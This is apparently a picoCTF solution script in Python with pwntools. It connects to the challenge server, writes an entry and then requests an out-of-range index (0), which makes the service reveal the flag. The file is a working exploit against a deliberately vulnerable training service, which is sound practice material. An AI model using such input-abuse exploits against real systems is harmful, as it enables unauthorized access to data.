# picoCTF-basic-file-exploit-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 50818

    p = remote(host, port)

    # write to buffer
    for i in range(4):
        p.recvline(timeout=1)
    p.sendline(b"1")
    for i in range(2):
        p.recvline(timeout=1)
    p.sendline(b"A")
    for i in range(2):
        p.recvline(timeout=1)
    p.sendline(b"2")

    # choose index out of entry number range
    for i in range(3):
        p.recvline(timeout=1)
    p.sendline(b"2")
    for i in range(2):
        p.recvline(timeout=1)
    p.sendline(b"0")
    p.recvline(timeout=1)

    # get flag
    flag = p.recvline(timeout=1).decode("utf-8").rstrip("\n")

    # close program
    p.sendline(b"3")
    p.close()

    # reveal flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()